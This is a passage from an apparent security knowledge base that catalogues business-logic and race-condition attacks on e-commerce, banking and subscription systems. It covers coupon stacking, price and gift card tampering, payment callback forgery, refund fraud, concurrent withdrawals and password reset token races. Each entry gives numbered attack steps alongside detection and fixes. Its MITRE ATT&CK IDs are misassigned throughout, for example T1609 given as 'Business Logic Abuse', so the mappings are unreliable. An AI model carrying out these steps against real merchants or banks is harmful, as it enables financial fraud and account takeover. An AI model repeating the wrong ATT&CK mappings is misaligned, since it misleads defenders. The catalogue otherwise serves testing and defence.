- **Detection**: Analyze deserialization inputs; detect known gadget chain signatures
- **Solution**: Patch dependencies; restrict classes allowed during deserialization; use hardened libraries
- **Tags**: Gadget Chains, RCE, Bypass

## Multiple Coupon Stacking for Excessive Discounts

- **Attack Type**: Promo Abuse
- **Target**: E-commerce Website
- **Vulnerability**: Improper validation of coupon stacking
- **MITRE**: T1589 – Data Manipulation
- **Impact**: Financial loss, revenue abuse
- **Tools**: Browser dev tools, intercepting proxies
- **Scenario**: Attacker exploits the ability to apply multiple coupons on one order, stacking discounts beyond limits.
- **Attack Steps**: Step 1: Open the online store and add products to the shopping cart. Step 2: Apply a valid promo code and note the discount. Step 3: Try to apply additional promo codes in the checkout or cart interface. Step 4: Use browser developer tools or intercepting proxies (e.g., Burp Suite) to modify requests if the UI blocks multiple coupons. Manually inject multiple coupon codes in API or form parameters. Step 5: If the backend does not properly validate or restrict coupon stacking, multiple discounts combine, greatly reducing the order price. Step 6: Complete checkout and pay the reduced amount, gaining excessive discount. Step 7: Repeat with different coupons or accounts to maximize benefits. Step 8: Merchants detect via auditing unusual discount stacking or price deviations. Step 9: Mitigate by enforcing strict server-side validation to allow only one coupon per order and checking cumulative discount caps.
- **Detection**: Monitor discount patterns; audit coupon usage
- **Solution**: Enforce server-side coupon limits; validate discount logic comprehensively
- **Tags**: Coupon Abuse, Promo Exploit

## Cancel Order → Refund Issued → Order Still Shipped

- **Attack Type**: Order & Refund Logic Flaw
- **Target**: E-commerce Website
- **Vulnerability**: Broken order/refund workflow logic
- **MITRE**: T1609 – Data Manipulation
- **Impact**: Financial loss, inventory depletion
- **Tools**: Manual testing, intercepting tools
- **Scenario**: Attacker cancels orders but the system refunds money and still ships the product, causing loss.
- **Attack Steps**: Step 1: Place an order on the e-commerce site and complete payment. Step 2: Request order cancellation via the website or customer service. Step 3: Observe the system issuing a refund while not stopping the shipping process. Step 4: Use intercepting proxies to test if cancellation requests can be manipulated or sent multiple times. Step 5: If backend order management does not synchronize refund and shipment properly, the product ships even after refund. Step 6: Attacker receives the product and money back. Step 7: Test various cancellation and refund scenarios to confirm repeatability. Step 8: Detect by tracking orders where refund and shipment overlap unusually. Step 9: Fix by implementing atomic transaction controls ensuring cancellation triggers shipment halt and refund coordination.
- **Detection**: Monitor order cancellations; reconcile shipment & refund status
- **Solution**: Atomic order/refund transactions; strong order state management
- **Tags**: Refund Abuse, Logic Flaw

## Promo Code Reuse Beyond Intended Limits

- **Attack Type**: Promo Abuse
- **Target**: E-commerce Website
- **Vulnerability**: Lack of promo code usage enforcement
- **MITRE**: T1589 – Data Manipulation
- **Impact**: Financial loss, unauthorized discounts
- **Tools**: Browser dev tools, proxies
- **Scenario**: Attackers reuse single-use promo codes multiple times, bypassing restrictions.
- **Attack Steps**: Step 1: Acquire a single-use promo code (e.g., through signup bonuses). Step 2: Use the promo code in checkout once successfully. Step 3: Try to reuse the same promo code again on the same or different account. Step 4: Use intercepting proxies to resend or replay promo code usage requests. Step 5: If backend does not properly track promo code usage or enforce single-use flags, the promo code applies multiple times. Step 6: Checkout multiple orders applying the same promo code, receiving discounts repeatedly. Step 7: Test with other promo codes to confirm the flaw. Step 8: Detect via audit logs checking promo code usage counts. Step 9: Fix by tracking promo code redemption status server-side and invalidating codes after use.
- **Detection**: Track promo code redemptions in logs; flag suspicious multiple uses
- **Solution**: Implement promo code usage state tracking; block reuse on single-use codes
- **Tags**: Promo Code Abuse, Discount Fraud

## Cart Manipulation via JavaScript Tampering

- **Attack Type**: Client-Side Manipulation
- **Target**: E-commerce Website
- **Vulnerability**: Trusting client-side price/quantity
- **MITRE**: T1589 – Data Manipulation
- **Impact**: Revenue loss, unfair pricing
- **Tools**: Browser dev tools (Console), proxies
- **Scenario**: Attackers modify cart prices or quantities using browser dev tools before submitting order.
- **Attack Steps**: Step 1: Add products to the cart on the website. Step 2: Open browser developer tools (e.g., Chrome DevTools). Step 3: Inspect and modify the price or quantity fields of cart items in the page DOM or JavaScript variables. Step 4: Submit the modified cart/order. Step 5: If server trusts client-side prices without validation, order confirms with tampered prices/quantities. Step 6: Attacker pays less than expected or receives more items. Step 7: Test multiple product prices and quantities to identify the vulnerability. Step 8: Detection requires monitoring order anomalies, price mismatches, and unusual quantities. Step 9: Fix by enforcing server-side validation of all prices and quantities, ignoring client-side inputs.
- **Detection**: Audit orders for suspicious values; use anomaly detection on orders
- **Solution**: Server-side price & quantity checks; ignore client data for critical calculations
- **Tags**: Price Tampering, Cart Manipulation

## Forced Account Linking to Steal Rewards

- **Attack Type**: Account Linking Exploit
- **Target**: E-commerce Website
- **Vulnerability**: Improper authorization in account linking
- **MITRE**: T1589 – Data Manipulation
- **Impact**: Theft of rewards, fraud, user trust loss
- **Tools**: Burp Suite, manual testing
- **Scenario**: Attacker forces victim accounts to link with attacker’s accounts to steal loyalty points or rewards.
- **Attack Steps**: Step 1: Identify features allowing account linking or merging (e.g., social login, reward programs). Step 2: Create a malicious account controlled by attacker. Step 3: Craft requests to link victim accounts to attacker’s account by tampering with user IDs or tokens in requests using proxy tools. Step 4: If backend does not properly verify ownership or authorization before linking, accounts link incorrectly. Step 5: Attacker’s account gains access to victim’s rewards, points, or benefits. Step 6: Test linking multiple victim accounts to attacker account. Step 7: Detect by tracking unexpected account linking events or reward transfers. Step 8: Fix by enforcing strict authorization checks and multi-factor verification for account linking.
- **Detection**: Monitor account linking logs; alert unusual linking patterns
- **Solution**: Enforce authorization checks; require user consent and validation before linking
- **Tags**: Account Linking, Rewards Theft

## Manipulating Order Status to Avoid Payment

- **Attack Type**: Business Logic Abuse
- **Target**: E-commerce Website
- **Vulnerability**: Broken business logic in order status
- **MITRE**: T1609 – Data Manipulation
- **Impact**: Financial loss, fraud, inventory loss
- **Tools**: Browser dev tools, intercepting proxies
- **Scenario**: Attacker changes order status (e.g., “paid” to “shipped”) without making actual payment to get goods for free.
- **Attack Steps**: Step 1: Place an order on the e-commerce site and start checkout. Step 2: Intercept the HTTP request that updates the order status using a proxy tool like Burp Suite or browser developer tools. Step 3: Locate the parameter controlling order status (e.g., “status=awaiting_payment”). Step 4: Modify this parameter to “status=paid” or “status=shipped” before the request reaches the server. Step 5: Send the modified request to the server. Step 6: If the backend does not verify payment status properly, it updates the order as paid or shipped. Step 7: Attacker can then get the product without paying. Step 8: Test with multiple orders to confirm if this manipulation works repeatedly. Step 9: Detect by auditing order status changes and payment confirmations mismatch. Step 10: Fix by enforcing strict server-side validation, cross-checking payment gateways before changing order status.
- **Detection**: Monitor order/payment status logs; alert mismatched payment/order statuses
- **Solution**: Enforce payment verification before status update; strong business logic validation
- **Tags**: Order Manipulation, Payment Bypass

## Gift Card Balance Manipulation

- **Attack Type**: Authorization & Input Tampering
- **Target**: E-commerce Website
- **Vulnerability**: Lack of server-side validation on balances
- **MITRE**: T1589 – Data Manipulation
- **Impact**: Financial fraud, monetary loss
- **Tools**: Browser dev tools, proxies
- **Scenario**: Attacker manipulates gift card balance values to increase their usable amount fraudulently.
- **Attack Steps**: Step 1: Obtain or purchase a gift card from the e-commerce platform. Step 2: Access the gift card balance via the user interface or API calls. Step 3: Using browser developer tools or proxy tools, intercept requests that show or update the gift card balance. Step 4: Modify the balance parameter in the request to a higher value (e.g., change 10.00 to 1000.00). Step 5: Resend the modified request to the server. Step 6: If the server does not validate the balance properly, it accepts the manipulated amount. Step 7: Use the inflated balance to pay for products or services. Step 8: Repeat the attack to accumulate more funds. Step 9: Detect via irregular gift card usage patterns and reconciliation audits. Step 10: Fix by validating all balance updates on the server side and encrypting sensitive parameters.
- **Detection**: Audit gift card transactions; monitor balance changes closely
- **Solution**: Server-side validation of gift card data; encrypt sensitive values; rate limit balance updates
- **Tags**: Gift Card Fraud, Input Tampering

## Checkout Process Skipping Validation Steps

- **Attack Type**: Business Logic Bypass
- **Target**: E-commerce Website
- **Vulnerability**: Missing server-side validation in checkout
- **MITRE**: T1609 – Business Logic Abuse
- **Impact**: Revenue loss, order inconsistency
- **Tools**: Browser dev tools, intercepting proxies
- **Scenario**: Attacker skips or bypasses validation steps (e.g., payment verification) during checkout to finalize orders.
- **Attack Steps**: Step 1: Begin checkout process on the e-commerce platform. Step 2: Intercept each request in the checkout flow using developer tools or proxy software. Step 3: Identify validation steps such as payment confirmation, stock checks, or promo validation. Step 4: Modify or remove requests to skip these validation steps (e.g., skip payment verification call). Step 5: Send manipulated requests to the server to finalize checkout. Step 6: If server trusts client flow and lacks strict checks, order gets placed without proper validations. Step 7: Attacker receives products without payment or correct stock reservation. Step 8: Repeat with different validation bypasses to confirm. Step 9: Detect via validation step audit logs and failed transaction tracking. Step 10: Fix by enforcing server-side validation of each critical checkout step regardless of client-side flow.
- **Detection**: Audit checkout process flow; monitor for skipped validations
- **Solution**: Implement server-side, end-to-end validation and atomic transactions
- **Tags**: Checkout Abuse, Logic Bypass

## Price Override via Client-Side Parameter Tampering

- **Attack Type**: Client-Side Input Manipulation
- **Target**: E-commerce Website
- **Vulnerability**: Trusting client input for price
- **MITRE**: T1589 – Data Manipulation
- **Impact**: Revenue loss, price manipulation
- **Tools**: Browser dev tools, intercepting proxies
- **Scenario**: Attacker modifies price parameters sent from client to server to pay less than actual price.
- **Attack Steps**: Step 1: Add products to cart on the e-commerce website. Step 2: Use browser developer tools or proxy to intercept the checkout request containing price parameters. Step 3: Identify price-related fields in request (e.g., "price", "unit_price", "total"). Step 4: Change price values to a lower amount, possibly zero or cents. Step 5: Forward the modified request to the server. Step 6: If the server does not verify or override client prices, order completes at tampered price. Step 7: Attacker pays less but receives full product. Step 8: Repeat with different products/prices to confirm vulnerability. Step 9: Detect by comparing submitted prices against master price lists and alerting mismatches. Step 10: Fix by enforcing strict server-side pricing control ignoring client price data.
- **Detection**: Monitor price discrepancies in orders; alert suspiciously low prices
- **Solution**: Enforce server-side authoritative pricing; discard client price input
- **Tags**: Price Tampering, Client Input

## Subscription Plan Downgrade Abuse for Refunds

- **Attack Type**: Subscription & Refund Abuse
- **Target**: Subscription Service
- **Vulnerability**: Broken subscription logic
- **MITRE**: T1609 – Business Logic Abuse
- **Impact**: Financial loss, service abuse
- **Tools**: Browser dev tools, intercepting proxies
- **Scenario**: Attacker downgrades subscription plan after payment, causing refund or extended usage improperly.
- **Attack Steps**: Step 1: Subscribe to a paid plan on the service or e-commerce platform. Step 2: Intercept the subscription update request using developer tools or proxy. Step 3: Modify the subscription plan parameter to a lower-cost or free plan after payment is made. Step 4: Send the modified request to the server. Step 5: If the server does not properly validate plan changes or payment adjustments, the downgrade applies. Step 6: Attacker receives refund or extends service duration unfairly. Step 7: Repeat to exploit multiple refunds or free access periods. Step 8: Detect through subscription plan audit logs and unusual refund frequency. Step 9: Fix by enforcing server-side validations on plan changes and refunds linked to payment status. Step 10: Implement alerts for repeated plan changes and refunds per user.
- **Detection**: Monitor subscription changes and refund patterns
- **Solution**: Server-side validation and approval of subscription changes and refunds
- **Tags**: Subscription Abuse, Refund Fraud

## Abusing Loyalty Points for Free Purchases

- **Attack Type**: Logic Flaw / Authorization
- **Target**: E-commerce Website
- **Vulnerability**: Insufficient server-side validation in loyalty system
- **MITRE**: T1609 – Business Logic Abuse
- **Impact**: Financial loss, loyalty program abuse
- **Tools**: Browser dev tools, intercepting proxies
- **Scenario**: Attacker manipulates loyalty points system to redeem goods without proper points deduction or validation.
- **Attack Steps**: Step 1: Log in to your user account on the e-commerce site. Step 2: Add items to the cart and proceed to checkout. Step 3: Use browser dev tools or proxy tool to intercept the request that applies loyalty points to the purchase. Step 4: Locate the parameter specifying the number of points used for discount or redemption. Step 5: Modify this parameter to a higher number or bypass deduction by setting it to zero or negative value. Step 6: Forward the manipulated request to the server. Step 7: If the backend does not validate the points balance or transaction properly, the purchase succeeds with illegitimate discount or free items. Step 8: Repeat this to get multiple free purchases. Step 9: Detect by monitoring loyalty point balances and unusual redemption patterns. Step 10: Fix by validating loyalty point balance and transactions entirely on the server side; never trust client input.
- **Detection**: Monitor loyalty point transactions; alert unusual redemptions
- **Solution**: Enforce strict server-side checks; secure loyalty point APIs
- **Tags**: Loyalty Abuse, Logic Flaws

## Abuse of Trial Period Extensions via Multiple Accounts

- **Attack Type**: Account Abuse / Logic Flaw
- **Target**: SaaS/Web Service
- **Vulnerability**: Weak user uniqueness verification
- **MITRE**: T1609 – Business Logic Abuse
- **Impact**: Revenue loss, service misuse
- **Tools**: Browser, proxy tools, multiple emails
- **Scenario**: Attacker creates multiple accounts to continually exploit free trial extensions beyond allowed limits.
- **Attack Steps**: Step 1: Register for a free trial on the service using a valid email address. Step 2: Use the free trial service until expiration. Step 3: Create a new user account with a different email address. Step 4: Repeat registration to get a new trial period again and again. Step 5: Use browser dev tools or intercept requests to see if trial period flags or usage counters exist in requests. Step 6: If no strong server-side checks tie trials to unique users (e.g., IP, device, payment), attacker can freely extend trial access. Step 7: Use automation tools (like Selenium or scripts) to create multiple accounts rapidly. Step 8: Detect by monitoring multiple account creations from same IP or device fingerprint. Step 9: Fix by enforcing stronger unique user identification, rate limiting registrations, and payment verification for trials. Step 10: Use CAPTCHA and behavioral analysis to reduce abuse.
- **Detection**: Monitor IP/device/user overlap; detect repeated trial usage
- **Solution**: Enforce payment method validation; strengthen account uniqueness verification
- **Tags**: Trial Abuse, Account Creation

## Exploiting Manual Approval Flows to Bypass Checks

- **Attack Type**: Process Logic Flaw
- **Target**: Business Workflow
- **Vulnerability**: Weak or flawed manual approval controls
- **MITRE**: T1609 – Business Logic Abuse
- **Impact**: Unauthorized access, financial loss
- **Tools**: Browser dev tools, intercepting proxies
- **Scenario**: Attacker exploits manual approval processes by submitting manipulated data to bypass security checks.
- **Attack Steps**: Step 1: Submit a request or form that requires manual approval (e.g., refund, price override, account upgrade). Step 2: Intercept the request with proxy or browser dev tools. Step 3: Modify parameters or data fields to values that normally would be rejected or flagged (e.g., higher refund amount). Step 4: Resend the manipulated request. Step 5: If manual approval process does not verify the authenticity or source properly, attacker’s request is approved automatically or quickly without proper checks. Step 6: Attacker repeats the process to escalate privileges, gain refunds, or get free services/products. Step 7: Detect via audit logs of manual approvals and comparing approval patterns. Step 8: Fix by automating approval processes with strict validations, logging, and alerts for suspicious requests. Step 9: Implement dual control or multi-person approval for critical actions. Step 10: Train staff to spot unusual or suspicious approval requests.
- **Detection**: Audit manual approval logs; monitor unusual approvals
- **Solution**: Automate validations; add multi-level approvals; improve staff training
- **Tags**: Logic Flaw, Manual Process Abuse

## Payment Gateway Callback Forgery

- **Attack Type**: Authentication / Logic Flaw
- **Target**: E-commerce Website
- **Vulnerability**: Lack of secure callback verification
- **MITRE**: T1586 – Network Service Manipulation
- **Impact**: Financial fraud, unauthorized access
- **Tools**: Burp Suite, intercepting proxies
- **Scenario**: Attacker forges payment gateway callback to trick the system into marking orders as paid without actual payment.
- **Attack Steps**: Step 1: Place an order and initiate payment through a third-party gateway. Step 2: Intercept the callback or webhook request from payment gateway to your server that marks payment success. Step 3: Study the callback parameters (e.g., transaction ID, amount, status). Step 4: Modify parameters to forge a valid payment confirmation (e.g., status=success, fake transaction ID). Step 5: Send the forged callback request to the server. Step 6: If server does not verify callback authenticity (e.g., signature, token), it updates order status as paid. Step 7: Attacker gets goods without paying. Step 8: Repeat with multiple orders to confirm vulnerability. Step 9: Detect by validating callback source IPs and signatures; audit payment confirmations. Step 10: Fix by verifying callback authenticity cryptographically (e.g., HMAC signatures, tokens), and cross-checking payment gateway logs.
- **Detection**: Monitor payment callback logs; alert unexpected IPs or unsigned requests
- **Solution**: Implement cryptographic verification on callbacks; whitelist IPs; use secure webhook methods
- **Tags**: Payment Fraud, Callback Forgery

## Unauthorized Account Balance Top-ups via Logic Flaws

- **Attack Type**: Logic Flaw / Authorization
- **Target**: E-commerce Website
- **Vulnerability**: Missing or weak validation of balance updates
- **MITRE**: T1609 – Business Logic Abuse
- **Impact**: Financial loss, fraud
- **Tools**: Browser dev tools, proxies
- **Scenario**: Attacker exploits flaws to increase their account balance (e.g., wallet, store credit) without payment.
- **Attack Steps**: Step 1: Log in to your user account with wallet/store credit. Step 2: Intercept requests related to balance updates or top-ups. Step 3: Modify parameters in requests that update balance (e.g., amount, transaction ID). Step 4: Resend the manipulated request to the server. Step 5: If server does not verify the legitimacy of top-up requests or payment confirmation, the balance increases fraudulently. Step 6: Use the inflated balance to buy products or services. Step 7: Repeat the process to accumulate high balance. Step 8: Detect by auditing transaction and balance changes; monitor for unusual top-ups. Step 9: Fix by validating all balance updates strictly on server side; link with real payment confirmation. Step 10: Use multi-factor verification for high-value balance changes.
- **Detection**: Audit transaction and balance logs; monitor for anomalies
- **Solution**: Server-side validation; require payment confirmation; implement transaction logging
- **Tags**: Balance Fraud, Logic Flaws

## Purchase Order Tampering with Backend Validation Bypass

- **Attack Type**: Logic Flaw / Input Manipulation
- **Target**: E-commerce Website
- **Vulnerability**: Lack of server-side validation of order data
- **MITRE**: T1609 – Business Logic Abuse
- **Impact**: Financial loss, inventory abuse
- **Tools**: Browser dev tools, proxy tools
- **Scenario**: Attacker modifies purchase order details to reduce price or quantity but backend fails to properly validate the data.
- **Attack Steps**: Step 1: Add desired products to cart and proceed to checkout. Step 2: Intercept the order submission request using a proxy tool or browser developer tools. Step 3: Locate the fields related to price, quantity, or product IDs in the request body or parameters. Step 4: Modify the values to lower prices or smaller quantities to reduce total payable amount. Step 5: Forward the modified request to the server. Step 6: If the backend does not revalidate prices or quantities from trusted sources (e.g., database), it accepts the tampered values. Step 7: Order is confirmed with incorrect prices or quantities. Step 8: Attacker completes checkout paying less than the actual price. Step 9: Repeat or automate to abuse the system extensively. Step 10: Detect by verifying order details on the server and comparing with known product prices; audit irregular orders. Step 11: Fix by enforcing server-side price and quantity validation from trusted data stores only.
- **Detection**: Audit order details; monitor price/quantity mismatches
- **Solution**: Validate all order data server-side; reject client-supplied prices or quantities
- **Tags**: Order Manipulation, Logic Flaw

## Exploiting Inconsistent Currency Conversions

- **Attack Type**: Logic Flaw / Financial Exploit
- **Target**: E-commerce Website
- **Vulnerability**: Inconsistent or missing server-side currency validation
- **MITRE**: T1609 – Business Logic Abuse
- **Impact**: Financial loss, accounting errors
- **Tools**: Proxy tools, spreadsheet tools
- **Scenario**: Attacker exploits discrepancies in currency conversion rates or formats to pay less or cause accounting errors.
- **Attack Steps**: Step 1: Browse the store and note prices displayed in multiple currencies if available. Step 2: Add items priced in one currency to the cart. Step 3: Intercept checkout or payment requests. Step 4: Modify currency or price fields manually in the request to mismatched currency codes or incorrect conversion values. Step 5: Forward the modified request to the server. Step 6: If the backend inconsistently applies currency conversions or trusts client-side conversions, attacker pays less or causes accounting mismatches. Step 7: Repeat or automate to cause significant financial impact or manipulate balances. Step 8: Detect via reconciliation of currency transactions and audit logs. Step 9: Fix by centralizing currency conversion logic server-side, never trusting client values. Step 10: Use consistent, verified currency rates and rounding rules.
- **Detection**: Reconcile currency transactions regularly; monitor anomalies
- **Solution**: Centralize currency conversion on server; validate currencies strictly
- **Tags**: Currency Exploit, Logic Flaw

## Forced Returns Without Product Receipt

- **Attack Type**: Logic Flaw / Refund Abuse
- **Target**: E-commerce Website
- **Vulnerability**: Insufficient verification of product returns
- **MITRE**: T1609 – Business Logic Abuse
- **Impact**: Financial loss via fraudulent refunds
- **Tools**: Browser tools, intercepting proxies
- **Scenario**: Attacker abuses return process to get refunds without actually returning products.
- **Attack Steps**: Step 1: Complete an order and receive the product. Step 2: Initiate a return request via the web interface. Step 3: Intercept the return submission request. Step 4: Modify parameters such as return status or product condition to signal that product was returned without actually shipping it back. Step 5: Forward the manipulated request. Step 6: If backend does not verify return shipment or condition properly, refund or credit is issued. Step 7: Use multiple accounts or automate to maximize fraudulent refunds. Step 8: Detect through return audits and shipment confirmations. Step 9: Fix by enforcing strict proof-of-return policies, tracking shipment status, and cross-checking warehouse receipts. Step 10: Use automated return management systems linked to logistics data.
- **Detection**: Audit return records against shipment data
- **Solution**: Link return approvals to shipment confirmations; automate return verification
- **Tags**: Refund Fraud, Logic Flaw

## Overlapping Discounts and Cashback Offers Abuse

- **Attack Type**: Logic Flaw / Promotion Abuse
- **Target**: E-commerce Website
- **Vulnerability**: Weak validation of promotion stacking rules
- **MITRE**: T1609 – Business Logic Abuse
- **Impact**: Financial loss, promotion abuse
- **Tools**: Browser tools, proxy interceptors
- **Scenario**: Attacker exploits system allowing multiple discount or cashback promotions stacking beyond intended limits.
- **Attack Steps**: Step 1: Add products eligible for discount or cashback offers to the cart. Step 2: Apply multiple coupon codes or cashback offers sequentially. Step 3: Intercept requests applying discounts via proxy or browser dev tools. Step 4: Modify parameters to apply all discounts simultaneously, bypassing system rules. Step 5: Forward modified requests. Step 6: If backend lacks strict promotion stacking rules or validation, attacker receives excessive discounts or cashback. Step 7: Complete checkout paying much less or getting cashbacks repeatedly. Step 8: Detect by monitoring promotional code usage and discount application patterns. Step 9: Fix by enforcing promotion stacking rules server-side and validating discount logic strictly. Step 10: Regularly audit promo code and cashback usage.
- **Detection**: Monitor promo code usage and stacking; alert unusual discount combinations
- **Solution**: Enforce strict discount rules server-side; disable unintended stacking
- **Tags**: Discount Abuse, Logic Flaw

## Abuse of Promotional Gifting Workflows

- **Attack Type**: Logic Flaw / Gift Abuse
- **Target**: E-commerce Website
- **Vulnerability**: Lack of server-side validation on gifting actions
- **MITRE**: T1609 – Business Logic Abuse
- **Impact**: Financial loss, promotional abuse
- **Tools**: Browser dev tools, proxy tools
- **Scenario**: Attacker abuses gifting or referral promotions by generating fake gifts or repeatedly triggering rewards.
- **Attack Steps**: Step 1: Use gifting or referral feature on the website to send gifts or rewards. Step 2: Intercept gifting request to see parameters for gift recipient, gift count, or reward triggers. Step 3: Modify parameters to increase gift counts or trigger multiple rewards for the same action. Step 4: Forward modified request to the server. Step 5: If backend lacks validation or limits on gifting actions, attacker gains excessive gifts or rewards. Step 6: Use multiple accounts or scripts to automate gifting and accumulate rewards. Step 7: Detect by analyzing gifting logs, frequency, and anomalies in rewards. Step 8: Fix by adding server-side limits, rate limiting gifting actions, and verifying legitimacy of recipients. Step 9: Implement captchas or behavioral analysis to reduce automation. Step 10: Regularly audit promotional gifting workflows.
- **Detection**: Audit gifting logs; monitor unusual gifting patterns
- **Solution**: Add limits, rate-limiting, and validation on gifting features
- **Tags**: Gift Abuse, Logic Flaw

## Double Withdrawal from Bank Account via Concurrent Requests

- **Attack Type**: Race Condition / Concurrency
- **Target**: Banking Application
- **Vulnerability**: Lack of concurrency control / atomic updates
- **MITRE**: T1069 – Exploitation for Privilege Escalation
- **Impact**: Financial loss, overdraft, fraud
- **Tools**: Burp Suite, Postman, scripting
- **Scenario**: Attacker exploits system by sending multiple withdrawal requests at the same time to withdraw more money than balance allows.
- **Attack Steps**: Step 1: Attacker logs into their bank account on the website. Step 2: Initiates a withdrawal request for an amount close to or equal to the account balance. Step 3: Before the first request is fully processed, attacker quickly sends one or more additional withdrawal requests simultaneously (using multiple browser tabs or automated scripts). Step 4: If the backend does not lock or serialize access to the account balance, multiple requests get processed before balance updates. Step 5: This results in multiple withdrawals exceeding the actual available balance. Step 6: Attacker effectively drains more money than they own. Step 7: Detection involves monitoring for simultaneous withdrawals from the same account in a very short time window. Step 8: Solution is to implement transactional locking or atomic checks on account balance updates, ensuring one withdrawal completes before processing the next.
- **Detection**: Monitor transaction concurrency; alert rapid repeated withdrawals
- **Solution**: Implement locking, database transactions, atomic balance checks
- **Tags**: Race Condition, Double Spend

## Inventory Depletion Using Multi-Threaded Checkout Attacks

- **Attack Type**: Race Condition / Stock Manipulation
- **Target**: E-commerce Platform
- **Vulnerability**: No atomic stock update / locking mechanism
- **MITRE**: T1609 – Business Logic Abuse
- **Impact**: Inventory inconsistency, lost sales
- **Tools**: Burp Suite, custom scripts
- **Scenario**: Attacker exploits lack of concurrency controls to buy more items than inventory available by sending multiple checkout requests simultaneously.
- **Attack Steps**: Step 1: Attacker browses an e-commerce site and finds a product with low inventory. Step 2: Adds the item to cart. Step 3: Initiates multiple checkout requests nearly simultaneously using multiple tabs or scripts. Step 4: If the backend does not properly lock inventory or check stock atomically, all requests succeed, reserving or selling more items than in stock. Step 5: Inventory count becomes negative or inconsistent. Step 6: Attacker may cause stockouts or disrupt sales. Step 7: Detection involves monitoring stock count anomalies and concurrent order submissions for the same product. Step 8: Fix by implementing database transactions and locks during inventory updates to prevent overselling.
- **Detection**: Monitor inventory stock levels; audit order concurrency
- **Solution**: Enforce atomic inventory operations and locks
- **Tags**: Race Condition, Inventory Exploit

## Concurrent API Requests Leading to Duplicate Transactions

- **Attack Type**: Race Condition / Duplicate Execution
- **Target**: API / Web Service
- **Vulnerability**: Missing idempotency or concurrency controls
- **MITRE**: T1609 – Business Logic Abuse
- **Impact**: Financial loss, duplicate charges
- **Tools**: Postman, scripting, Burp Suite
- **Scenario**: Attacker exploits weak handling of API calls allowing duplicate payment or transaction creation by rapid repeated requests.
- **Attack Steps**: Step 1: Attacker authenticates with the API or web app. Step 2: Sends an API request to perform a transaction (e.g., payment, transfer). Step 3: Before the server processes the first request, attacker sends duplicate requests very quickly. Step 4: If server lacks idempotency or locking, multiple transactions are processed independently. Step 5: Result is duplicate transactions (double payment or duplicate order). Step 6: Attacker may repeat to multiply financial or inventory impact. Step 7: Detection requires monitoring for multiple identical transactions from the same user or session in short timeframes. Step 8: Solution is to enforce idempotency keys or use locking to ensure only one transaction per request is processed.
- **Detection**: Audit duplicate transactions; monitor rapid repeated API calls
- **Solution**: Implement idempotency, locking, or transaction deduplication
- **Tags**: Race Condition, Duplicate Payment

## Race Condition in Account Registration for Username Squatting

- **Attack Type**: Race Condition / User Registration
- **Target**: Web App Registration
- **Vulnerability**: No atomic uniqueness check during signup
- **MITRE**: T1609 – Business Logic Abuse
- **Impact**: Denial of service, username squatting
- **Tools**: Browser dev tools, Burp Suite
- **Scenario**: Attacker sends simultaneous registration requests with the same username to claim it before legitimate users can.
- **Attack Steps**: Step 1: Attacker attempts to register an account with a desired username. Step 2: Sends multiple registration requests simultaneously or in rapid succession with the same username. Step 3: If backend does not lock or check username uniqueness atomically, multiple accounts with same username may be created or attacker wins the race to claim it. Step 4: Legitimate user attempts to register but username is taken unfairly. Step 5: This can disrupt service or reputation. Step 6: Detect by monitoring rapid repeat registrations with same username or failed uniqueness checks. Step 7: Fix by enforcing atomic uniqueness checks and locks in user registration logic.
- **Detection**: Monitor signup attempts; detect duplicate username registrations
- **Solution**: Enforce database constraints and atomic checks on username uniqueness
- **Tags**: Race Condition, Username Squatting

## Exploiting Race Condition in Password Reset Token Generation

- **Attack Type**: Race Condition / Token Reuse Exploit
- **Target**: User Account Service
- **Vulnerability**: Lack of atomic token invalidation / rotation
- **MITRE**: T1609 – Business Logic Abuse
- **Impact**: Account takeover, unauthorized access
- **Tools**: Burp Suite, Postman, scripting
- **Scenario**: Attacker abuses token generation race condition to obtain or reuse password reset tokens multiple times.
- **Attack Steps**: Step 1: Attacker requests a password reset email for a target account. Step 2: Sends multiple password reset requests in rapid succession. Step 3: If backend does not invalidate or rotate tokens atomically, multiple valid tokens may be active simultaneously. Step 4: Attacker intercepts or guesses token values. Step 5: Uses any valid token to reset the password and gain access. Step 6: Can reuse tokens or race with victim to reset passwords multiple times. Step 7: Detection involves monitoring multiple password reset requests for same account in short time. Step 8: Fix by ensuring token generation, storage, and invalidation happens atomically; only one active token allowed per user at a time.
- **Detection**: Monitor password reset request frequency and token issuance
- **Solution**: Invalidate old tokens immediately; allow only one active reset token per user
- **Tags**: Race Condition, Token Reuse

## Race in Coupon Redemption to Bypass Usage Limits

- **Attack Type**: Race Condition / Business Logic
- **Target**: Online Store / Checkout
- **Vulnerability**: Lack of atomic coupon usage updates
- **MITRE**: T1609 – Business Logic Abuse
- **Impact**: Financial loss, abuse of promotional offers
- **Tools**: Burp Suite, scripting
- **Scenario**: Attacker redeems a coupon multiple times by submitting concurrent redemption requests faster than the system can update usage count.
- **Attack Steps**: Step 1: Attacker obtains a valid coupon code limited to one use per user/account. Step 2: Initiates multiple checkout requests simultaneously with the same coupon code. Step 3: If the backend does not lock or serialize coupon usage checks, each request may succeed before the system updates the coupon usage count. Step 4: Attacker successfully redeems the coupon multiple times, receiving excessive discounts or free products. Step 5: Detection involves monitoring multiple uses of same coupon in rapid succession from the same user or account. Step 6: Solution is to implement atomic locking on coupon redemption logic so only one redemption per coupon per user is allowed at a time.
- **Detection**: Monitor coupon redemption frequency; alert on rapid repeated use
- **Solution**: Use transactional locking and atomic checks on coupon usage
- **Tags**: Race Condition, Coupon Abuse

## Race Condition in Access Control for Privilege Escalation

- **Attack Type**: Race Condition / Access Control
- **Target**: Web App
- **Vulnerability**: No atomic enforcement of access control
- **MITRE**: T1609 – Business Logic Abuse
- **Impact**: Unauthorized privilege escalation
- **Tools**: Burp Suite, custom scripts
- **Scenario**: Attacker exploits concurrent requests to change privileges before access control checks finalize.
- **Attack Steps**: Step 1: Attacker authenticates with a normal user account. Step 2: Simultaneously sends multiple requests trying to perform privilege escalation actions (e.g., updating user role). Step 3: Backend fails to enforce serialized access control checks or atomic role updates. Step 4: Attacker manages to escalate privileges by having at least one request complete with elevated rights before checks finalize. Step 5: Gains unauthorized access to admin or privileged features. Step 6: Detection includes monitoring rapid privilege change attempts and concurrent conflicting requests. Step 7: Fix by enforcing locking or atomic transactions on access control enforcement logic.
- **Detection**: Log suspicious privilege change attempts; monitor conflicting concurrent requests
- **Solution**: Enforce atomic role updates and serialized access control
- **Tags**: Race Condition, Privilege Escalation

## Race Attack on Seat Reservation Systems in Ticketing

- **Attack Type**: Race Condition / Resource Allocation
- **Target**: Ticket Booking System
- **Vulnerability**: Lack of atomic seat reservation locking
- **MITRE**: T1609 – Business Logic Abuse
- **Impact**: Double booking, customer complaints
- **Tools**: Burp Suite, scripts, automation
